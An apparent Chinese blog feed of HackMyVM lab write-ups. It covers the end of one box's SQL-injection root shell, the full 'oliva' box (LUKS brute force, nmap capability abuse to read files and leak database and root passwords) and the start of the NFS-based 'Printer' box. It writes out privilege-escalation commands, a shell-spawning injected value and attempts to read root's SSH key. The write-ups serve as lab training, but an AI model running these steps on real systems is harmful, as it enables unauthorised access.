<p>第二个参数是个状态<code>[&quot;Done&quot;, &quot;Doing&quot;, &quot;To do&quot;]</code><br>那么就可以注入一个命令拿到root的shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">SELECT * FROM projects WHERE proid <span class="token operator">=</span> <span class="token string">"\! /bin/bash"</span><span class="token punctuation">;</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">carlos@literal:~$ <span class="token function">sudo</span> /opt/my_things/blog/update_project_status.py <span class="token string">'\! /bin/bash'</span> Done
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Before update project <span class="token punctuation">(</span><span class="token punctuation">\</span><span class="token operator">!</span> /bin/bash<span class="token punctuation">)</span>

root@literal:/home/carlos<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
<p>舒服了，复习去了。</p>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-oliva</title>
    <url>/posts/8a0eae7/</url>
    <content><![CDATA[<p><strong>难度:easy</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.166</strong></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nmap 192.168.56.166 -sV -A -p-</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-04-27 <span class="token number">22</span>:12 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.166
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00082s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65533</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE VERSION
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">9</span>.2p1 Debian <span class="token number">2</span> <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">256</span> 6d:84:71:14:03:7d:7e:c8:6f:dd:24:92:a8:8e:f7:e9 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> d8:5e:39:87:9e:a1:a6:75:9a:28:78:ce:84:f7:05:7a <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    nginx <span class="token number">1.22</span>.1
<span class="token operator">|</span>_http-title: Welcome to nginx<span class="token operator">!</span>
<span class="token operator">|</span>_http-server-header: nginx/1.22.1
MAC Address: 08:00:27:63:89:3E <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Device type: general purpose
Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>
Network Distance: <span class="token number">1</span> hop
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.82</span> ms <span class="token number">192.168</span>.56.166

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">11.99</span> seconds</code></pre>
<p>正常的22 80两个端口</p>
<h2 id="web信息收集"><a href="#web信息收集" class="headerlink" title="web信息收集"></a>web信息收集</h2><p><img src="https://ooo.0x0.ooo/2024/04/27/OpEx1j.png" alt="OpEx1j.png" loading="lazy"><br>apache的默认界面,没什么用。</p>
<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># dirsearch -u http://192.168.56.166</span>
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources <span class="token function">import</span> DistributionNotFound, VersionConflict

  _<span class="token operator">|</span><span class="token builtin class-name">.</span> _ _  _  _  _ _<span class="token operator">|</span>_    v0.4.3                                                                                                                                                                                                                    
 <span class="token punctuation">(</span>_<span class="token operator">||</span><span class="token operator">|</span> _<span class="token punctuation">)</span> <span class="token punctuation">(</span>/_<span class="token punctuation">(</span>_<span class="token operator">||</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token punctuation">)</span>                                                                                                                                                                                                                             
                                                                                                                                                                                                                                                    
Extensions: php, aspx, jsp, html, js <span class="token operator">|</span> HTTP method: GET <span class="token operator">|</span> Threads: <span class="token number">25</span> <span class="token operator">|</span> Wordlist size: <span class="token number">11460</span>

Output File: /root/Desktop/reports/http_192.168.56.166/_24-04-27_22-14-15.txt

Target: http://192.168.56.166/

<span class="token punctuation">[</span><span class="token number">22</span>:14:15<span class="token punctuation">]</span> Starting:                                                                                                                                                                                                                                
<span class="token punctuation">[</span><span class="token number">22</span>:14:32<span class="token punctuation">]</span> <span class="token number">200</span> -   69B  - /index.php                                        
                                                                             
Task Completed </code></pre>
<p>只有一个php目录<br><img src="https://ooo.0x0.ooo/2024/04/27/OpEzHp.png" alt="OpEzHp.png" loading="lazy"><br>点击<code>CLICK</code>下载下来一个<code>oliva</code>文件,放到kali下查看一下是什么文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># file oliva </span>
oliva: LUKS encrypted file, ver <span class="token number">2</span>, header size <span class="token number">16384</span>, ID <span class="token number">3</span>, algo sha256, salt 0x14fa423af24634e8<span class="token punctuation">..</span>., UUID: 9a391896-2dd5-4f2c-84cf-1ba6e4e0577e, crc 0x6118d2d9b595355f<span class="token punctuation">..</span>., at 0x1000 <span class="token punctuation">&#123;</span><span class="token string">"keyslots"</span>:<span class="token punctuation">&#123;</span><span class="token string">"0"</span>:<span class="token punctuation">&#123;</span><span class="token string">"type"</span><span class="token builtin class-name">:</span><span class="token string">"luks2"</span>,<span class="token string">"key_size"</span>:64,<span class="token string">"af"</span>:<span class="token punctuation">&#123;</span><span class="token string">"type"</span><span class="token builtin class-name">:</span><span class="token string">"luks1"</span>,<span class="token string">"stripes"</span>:4000,<span class="token string">"hash"</span><span class="token builtin class-name">:</span><span class="token string">"sha256"</span><span class="token punctuation">&#125;</span>,<span class="token string">"area"</span>:<span class="token punctuation">&#123;</span><span class="token string">"type"</span><span class="token builtin class-name">:</span><span class="token string">"raw"</span>,"offse</code></pre>
<blockquote>
<p>LUKS （Linux Unified Key Setup）是 Linux 硬盘加密的标准。 通过提供标准的磁盘格式，它不仅可以促进发行版之间的兼容性，还可以提供对多个用户密码的安全管理。 与现有解决方案相比，LUKS<br>将所有必要的设置信息存储在分区信息首部中，使用户能够无缝传输或迁移其数据。</p>
</blockquote>
<p>kali上正好有一个工具可以爆破<code>bruteforce-luks</code><br><code>bruteforce-luks -t 4 -f /usr/share/wordlists/rockyou.txt -v 10 oliva</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># bruteforce-luks -f /usr/share/wordlists/rockyou.txt -v 10 oliva  -t 5</span>
Warning: using dictionary mode, ignoring options -b, -e, -l, <span class="token parameter variable">-m</span> and -s.

Tried passwords: <span class="token number">0</span>
Tried passwords per second: <span class="token number">0.000000</span>
Last tried password: iloveyou

Tried passwords: <span class="token number">5</span>
Tried passwords per second: <span class="token number">0.250000</span>
Last tried password: abc123

Tried passwords: <span class="token number">5</span>
Tried passwords per second: <span class="token number">0.166667</span>
Last tried password: abc123

<span class="token punctuation">..</span><span class="token punctuation">..</span>
Tried passwords: <span class="token number">929</span>
Tried passwords per second: <span class="token number">0.569939</span>
Last tried password: gateway

Tried passwords: <span class="token number">937</span>
Tried passwords per second: <span class="token number">0.571341</span>
Last tried password: beatriz

Tried passwords: <span class="token number">945</span>
Tried passwords per second: <span class="token number">0.572727</span>
Last tried password: trouble

Tried passwords: <span class="token number">949</span>
Tried passwords per second: <span class="token number">0.571687</span>
Last tried password: brian

Tried passwords: <span class="token number">951</span>
Tried passwords per second: <span class="token number">0.569461</span>
Last tried password: hannah1

Tried passwords: <span class="token number">958</span>
Tried passwords per second: <span class="token number">0.570238</span>
Last tried password: lover1

Tried passwords: <span class="token number">967</span>
Tried passwords per second: <span class="token number">0.572189</span>
Last tried password: <span class="token number">87654321</span>

Tried passwords: <span class="token number">970</span>
Tried passwords per second: <span class="token number">0.572271</span>
Last tried password: pollito

Password found: be****</code></pre>
<p>爆出来密码be***<br>看看文件里有啥<br><code>cryptsetup luksOpen oliva olive1</code><br><img src="https://ooo.0x0.ooo/2024/04/27/OpEFXU.png" alt="OpEFXU.png" loading="lazy"><br>拿到密码<code>Yesthatsmypass!</code></p>
<h2 id="user权限"><a href="#user权限" class="headerlink" title="user权限"></a>user权限</h2><p>ssh连接oliva</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">                                                                                                                                                                                                                                                    
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ssh oliva@192.168.56.166</span>
oliva@192.168.56.166's password: 
Linux oliva <span class="token number">6.1</span>.0-9-amd64 <span class="token comment">#1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64</span>

The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jul  <span class="token number">4</span> <span class="token number">10</span>:27:00 <span class="token number">2023</span> from <span class="token number">192.168</span>.0.100
oliva@oliva:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>oliva<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>oliva<span class="token punctuation">)</span> <span class="token assign-left variable">grupos</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>oliva<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,25<span class="token punctuation">(</span>floppy<span class="token punctuation">)</span>,29<span class="token punctuation">(</span>audio<span class="token punctuation">)</span>,30<span class="token punctuation">(</span>dip<span class="token punctuation">)</span>,44<span class="token punctuation">(</span>video<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,100<span class="token punctuation">(</span>users<span class="token punctuation">)</span>,106<span class="token punctuation">(</span>netdev<span class="token punctuation">)</span></code></pre>
<p>拿到user权限</p>
<h2 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h2><p>传入linpeas.sh分析发现nmap指令有读取文件的权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation<span class="token comment">#capabilities                                                                                                                                                                     </span>
Current <span class="token function">env</span> capabilities:                                                                                                                                                                                                                           
Current: <span class="token operator">=</span>
Current proc capabilities:
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 000001ffffffffff
CapAmb: 0000000000000000

Parent Shell capabilities:
<span class="token assign-left variable">0x0000000000000000</span><span class="token operator">=</span>

Files with capabilities <span class="token punctuation">(</span>limited to <span class="token number">50</span><span class="token punctuation">)</span>:
/usr/bin/nmap <span class="token assign-left variable">cap_dac_read_search</span><span class="token operator">=</span>eip
/usr/bin/ping <span class="token assign-left variable">cap_net_raw</span><span class="token operator">=</span>ep
</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">oliva@oliva:~$ nmap <span class="token parameter variable">-h</span>
Nmap <span class="token number">7.93</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span>
Usage: nmap <span class="token punctuation">[</span>Scan Type<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>Options<span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>target specification<span class="token punctuation">&#125;</span>
TARGET SPECIFICATION:
  Can pass hostnames, IP addresses, networks, etc.
  Ex: scanme.nmap.org, microsoft.com/24, <span class="token number">192.168</span>.0.1<span class="token punctuation">;</span> <span class="token number">10.0</span>.0-255.1-254
  <span class="token parameter variable">-iL</span> <span class="token operator">&lt;</span>inputfilename<span class="token operator">></span>: Input from list of hosts/networks
  <span class="token parameter variable">-iR</span> <span class="token operator">&lt;</span>num hosts<span class="token operator">></span>: Choose random targets
  <span class="token parameter variable">--exclude</span> <span class="token operator">&lt;</span>host1<span class="token punctuation">[</span>,host2<span class="token punctuation">]</span><span class="token punctuation">[</span>,host3<span class="token punctuation">]</span>,<span class="token punctuation">..</span>.<span class="token operator">></span>: Exclude hosts/networks
  <span class="token parameter variable">--excludefile</span> <span class="token operator">&lt;</span>exclude_file<span class="token operator">></span>: Exclude list from <span class="token function">file</span>
HOST DISCOVERY:
  -sL: List Scan - simply list targets to scan
  -sn: Ping Scan - disable port scan
  -Pn: Treat all hosts as online -- skip <span class="token function">host</span> discovery
  -PS/PA/PU/PY<span class="token punctuation">[</span>portlist<span class="token punctuation">]</span>: TCP SYN/ACK, UDP or SCTP discovery to given ports
  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
  -PO<span class="token punctuation">[</span>protocol list<span class="token punctuation">]</span>: IP Protocol Ping
  -n/-R: Never <span class="token keyword">do</span> DNS resolution/Always resolve <span class="token punctuation">[</span>default: sometimes<span class="token punctuation">]</span></code></pre>
<p>nmap 的 <code>-iL</code>参数可以 输出文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">oliva@oliva:~$ nmap <span class="token parameter variable">-iL</span> /root/root.txt
Failed to <span class="token function">open</span> input <span class="token function">file</span> /root/root.txt <span class="token keyword">for</span> reading: No such <span class="token function">file</span> or directory <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></code></pre>
<p>想直接读一下root的flag发现失败，可能名字不叫这个</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">oliva@oliva:~$ nmap <span class="token parameter variable">-iL</span> /root/.ssh/id_rsa
Failed to <span class="token function">open</span> input <span class="token function">file</span> /root/.ssh/id_rsa <span class="token keyword">for</span> reading: No such <span class="token function">file</span> or directory <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></code></pre>
<p>root的私钥也没有<br>看一下index.php</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">oliva@oliva:~$ nmap <span class="token parameter variable">-iL</span> /var/www/html/index.php
Starting Nmap <span class="token number">7.93</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-04-27 <span class="token number">16</span>:51 CEST
Failed to resolve <span class="token string">"Hi"</span><span class="token builtin class-name">.</span>
Failed to resolve <span class="token string">"oliva,"</span><span class="token builtin class-name">.</span>
Failed to resolve <span class="token string">"Here"</span><span class="token builtin class-name">.</span>
Failed to resolve <span class="token string">"the"</span><span class="token builtin class-name">.</span>
Failed to resolve <span class="token string">"pass"</span><span class="token builtin class-name">.</span>
Failed to resolve <span class="token string">"to"</span><span class="token builtin class-name">.</span>
Failed to resolve <span class="token string">"obtain"</span><span class="token builtin class-name">.</span>
Failed to resolve <span class="token string">"root:"</span><span class="token builtin class-name">.</span>
Failed to resolve <span class="token string">"&lt;?php"</span><span class="token builtin class-name">.</span>
Failed to resolve <span class="token string">"<span class="token variable">$dbname</span>"</span><span class="token builtin class-name">.</span>
Failed to resolve <span class="token string">"="</span><span class="token builtin class-name">.</span>
Failed to resolve <span class="token string">"'easy';"</span><span class="token builtin class-name">.</span>
Failed to resolve <span class="token string">"<span class="token variable">$dbuser</span>"</span><span class="token builtin class-name">.</span>
Failed to resolve <span class="token string">"="</span><span class="token builtin class-name">.</span>
Failed to resolve <span class="token string">"'root';"</span><span class="token builtin class-name">.</span>
Failed to resolve <span class="token string">"<span class="token variable">$dbpass</span>"</span><span class="token builtin class-name">.</span>
Failed to resolve <span class="token string">"="</span><span class="token builtin class-name">.</span>
Failed to resolve <span class="token string">"'Savingmypass';"</span><span class="token builtin class-name">.</span>
Failed to resolve <span class="token string">"<span class="token variable">$dbhost</span>"</span><span class="token builtin class-name">.</span>
Failed to resolve <span class="token string">"="</span><span class="token builtin class-name">.</span>
Failed to resolve <span class="token string">"'localhost';"</span><span class="token builtin class-name">.</span>
Failed to resolve <span class="token string">"?>"</span><span class="token builtin class-name">.</span>
Failed to resolve <span class="token string">"&lt;a"</span><span class="token builtin class-name">.</span>
Unable to <span class="token function">split</span> netmask from target expression: <span class="token string">"href="</span>oliva<span class="token string">">CLICK!&lt;/a>"</span>
WARNING: No targets were specified, so <span class="token number">0</span> hosts scanned.
Nmap done: <span class="token number">0</span> IP addresses <span class="token punctuation">(</span><span class="token number">0</span> hosts up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.19</span> seconds</code></pre>
<p>泄露了mysql的密码<code>Savingmypass</code>,那就直接进MySQL</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">oliva@oliva:~$ mysql <span class="token parameter variable">-u</span> root <span class="token parameter variable">-p</span>
Enter password: 
Welcome to the MariaDB monitor.  Commands end with <span class="token punctuation">;</span> or <span class="token punctuation">\</span>g.
Your MariaDB connection <span class="token function">id</span> is <span class="token number">8</span>
Server version: <span class="token number">10.11</span>.3-MariaDB-1 Debian <span class="token number">12</span>

Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2000</span>, <span class="token number">2018</span>, Oracle, MariaDB Corporation Ab and others.

Type <span class="token string">'help;'</span> or <span class="token string">'\h'</span> <span class="token keyword">for</span> help. Type <span class="token string">'\c'</span> to <span class="token function">clear</span> the current input statement.

MariaDB <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> show databaes<span class="token punctuation">;</span>
ERROR <span class="token number">1064</span> <span class="token punctuation">(</span><span class="token number">42000</span><span class="token punctuation">)</span>: You have an error <span class="token keyword">in</span> your SQL syntax<span class="token punctuation">;</span> check the manual that corresponds to your MariaDB server version <span class="token keyword">for</span> the right syntax to use near <span class="token string">'databaes'</span> at line <span class="token number">1</span>
MariaDB <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> show databases<span class="token punctuation">;</span>
+--------------------+
<span class="token operator">|</span> Database           <span class="token operator">|</span>
+--------------------+
<span class="token operator">|</span> easy               <span class="token operator">|</span>
<span class="token operator">|</span> information_schema <span class="token operator">|</span>
<span class="token operator">|</span> mysql              <span class="token operator">|</span>
<span class="token operator">|</span> performance_schema <span class="token operator">|</span>
<span class="token operator">|</span> sys                <span class="token operator">|</span>
+--------------------+
<span class="token number">5</span> rows <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0,089</span> sec<span class="token punctuation">)</span>

MariaDB <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> use easy<span class="token punctuation">;</span>
Reading table information <span class="token keyword">for</span> completion of table and <span class="token function">column</span> names
You can turn off this feature to get a quicker startup with <span class="token parameter variable">-A</span>

Database changed
MariaDB <span class="token punctuation">[</span>easy<span class="token punctuation">]</span><span class="token operator">></span> show tables<span class="token punctuation">;</span>
+----------------+
<span class="token operator">|</span> Tables_in_easy <span class="token operator">|</span>
+----------------+
<span class="token operator">|</span> logging        <span class="token operator">|</span>
+----------------+
<span class="token number">1</span> row <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0,000</span> sec<span class="token punctuation">)</span>

MariaDB <span class="token punctuation">[</span>easy<span class="token punctuation">]</span><span class="token operator">></span> <span class="token keyword">select</span> * from logging<span class="token punctuation">;</span>
+--------+------+--------------+
<span class="token operator">|</span> id_log <span class="token operator">|</span> uzer <span class="token operator">|</span> pazz         <span class="token operator">|</span>
+--------+------+--------------+
<span class="token operator">|</span>      <span class="token number">1</span> <span class="token operator">|</span> root <span class="token operator">|</span> O*********** <span class="token operator">|</span>
+--------+------+--------------+
<span class="token number">1</span> row <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0,009</span> sec<span class="token punctuation">)</span></code></pre>
<p>拿到了root的密码<code>O******</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">oliva@oliva:~$ <span class="token function">su</span> root
Contraseña: 
root@oliva:/home/oliva<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">grupos</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
root@oliva:/home/oliva<span class="token comment"># ls -al /root</span>
total <span class="token number">32</span>
drwx------  <span class="token number">4</span> root root <span class="token number">4096</span> jul  <span class="token number">4</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">18</span> root root <span class="token number">4096</span> jul  <span class="token number">4</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
lrwxrwxrwx  <span class="token number">1</span> root root    <span class="token number">9</span> jul  <span class="token number">4</span>  <span class="token number">2023</span> .bash_history -<span class="token operator">></span> /dev/null
-rw-r--r--  <span class="token number">1</span> root root  <span class="token number">571</span> abr <span class="token number">10</span>  <span class="token number">2021</span> .bashrc
drwxr-xr-x  <span class="token number">3</span> root root <span class="token number">4096</span> jul  <span class="token number">4</span>  <span class="token number">2023</span> .local
-rw-------  <span class="token number">1</span> root root  <span class="token number">567</span> jul  <span class="token number">4</span>  <span class="token number">2023</span> .mysql_history
-rw-r--r--  <span class="token number">1</span> root root  <span class="token number">161</span> jul  <span class="token number">9</span>  <span class="token number">2019</span> .profile
-rw-------  <span class="token number">1</span> root root   <span class="token number">24</span> jul  <span class="token number">4</span>  <span class="token number">2023</span> rutflag.txt
drwx------  <span class="token number">2</span> root root <span class="token number">4096</span> jul  <span class="token number">4</span>  <span class="token number">2023</span> .ssh</code></pre>
<p>root!原来root.txt改名叫rutflag.txt果然不想让我直接读。</p>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
  </entry>
  <entry>
    <title>HackMyVM-Printer</title>
    <url>/posts/5e0f535b/</url>
    <content><![CDATA[<p><strong>难度:hard</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.191</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> arp-scan <span class="token parameter variable">-l</span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.100  08:00:27:7d:89:3a       PCS Systemtechnik GmbH
<span class="token number">192.168</span>.56.191  08:00:27:07:95:7b       PCS Systemtechnik GmbH

<span class="token number">3</span> packets received by filter, <span class="token number">0</span> packets dropped by kernel
Ending arp-scan <span class="token number">1.10</span>.0: <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">1.942</span> seconds <span class="token punctuation">(</span><span class="token number">131.82</span> hosts/sec<span class="token punctuation">)</span>. <span class="token number">3</span> responded</code></pre>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap <span class="token number">192.168</span>.56.191                                                  
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-06-30 <span class="token number">19</span>:01 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.191
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00045s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">997</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT     STATE SERVICE
<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>
<span class="token number">111</span>/tcp  <span class="token function">open</span>  rpcbind
<span class="token number">2049</span>/tcp <span class="token function">open</span>  nfs
MAC Address: 08:00:27:07:95:7B <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.13</span> seconds</code></pre>
<p>开放了 22 1111 2049三个端口</p>
<blockquote>
<p>111端口是RPC服务的端口，它是<strong>Remote Procedure Call（远程过程调用）</strong>协议的默认端口1。在Linux系统中，许多重要的分布式服务都使用RPC协议进行通信，例如NFS、NIS等，它们都依赖于111端口进行通信。<br>2049端口是NFS（Network File System）协议使用的默认端口，主要用于文件系统共享。NFS是一种分布式文件系统，允许用户透明地在网络上共享文件。NFS服务器提供存储在本地磁盘上的文件和目录的访问权限，并允许用户通过网络共享文件。</p>
</blockquote>
<h2 id="挂在nfs服务"><a href="#挂在nfs服务" class="headerlink" title="挂在nfs服务"></a>挂在nfs服务</h2> <pre class="language-bash" data-language="bash"><code class="language-bash"> <span class="token operator">></span> showmount <span class="token parameter variable">-e</span> <span class="token number">192.168</span>.56.191
Export list <span class="token keyword">for</span> <span class="token number">192.168</span>.56.191:
/home/lisa *</code></pre>
<p>发现用户名是<code>lisa</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">mount</span> <span class="token parameter variable">-t</span> nfs <span class="token number">192.168</span>.56.191:/home/lisa  lisaa <span class="token parameter variable">-o</span> nolock 
<span class="token operator">></span> <span class="token builtin class-name">cd</span> lisaa  
<span class="token operator">></span> <span class="token function">ls</span> <span class="token parameter variable">-al</span>
ls: .ssh: Permission denied
ls: user.txt: Permission denied
total <span class="token number">32</span>
drwxr-xr-x <span class="token number">4</span> <span class="token number">1098</span> tao  <span class="token number">4096</span> Jan  <span class="token number">8</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">3</span> root root <span class="token number">4096</span> Jun <span class="token number">30</span> <span class="token number">19</span>:08 <span class="token punctuation">..</span>
lrwxrwxrwx <span class="token number">1</span> root root    <span class="token number">9</span> Jan  <span class="token number">7</span>  <span class="token number">2023</span> .bash_history -<span class="token operator">></span> /dev/null
-rw-r--r-- <span class="token number">1</span> <span class="token number">1098</span> tao   <span class="token number">220</span> Jan  <span class="token number">7</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> <span class="token number">1098</span> tao  <span class="token number">3555</span> Jan  <span class="token number">8</span>  <span class="token number">2023</span> .bashrc
drwxr-xr-x <span class="token number">3</span> <span class="token number">1098</span> tao  <span class="token number">4096</span> Jan  <span class="token number">7</span>  <span class="token number">2023</span> .local
-rw-r--r-- <span class="token number">1</span> <span class="token number">1098</span> tao   <span class="token number">807</span> Jan  <span class="token number">7</span>  <span class="token number">2023</span> .profile
drwx------ <span class="token number">2</span> <span class="token number">1098</span> tao  <span class="token number">4096</span> Jan  <span class="token number">8</span>  <span class="token number">2023</span> .ssh
-rwx------ <span class="token number">1</span> <span class="token number">1098</span> tao    <span class="token number">33</span> Jan  <span class="token number">7</span>  <span class="token number">2023</span> user.txt</code></pre>
<p>不过都没权限访问，因为我的uid不是1098，所以需要创建一个uid为1098的用户绕过</p>
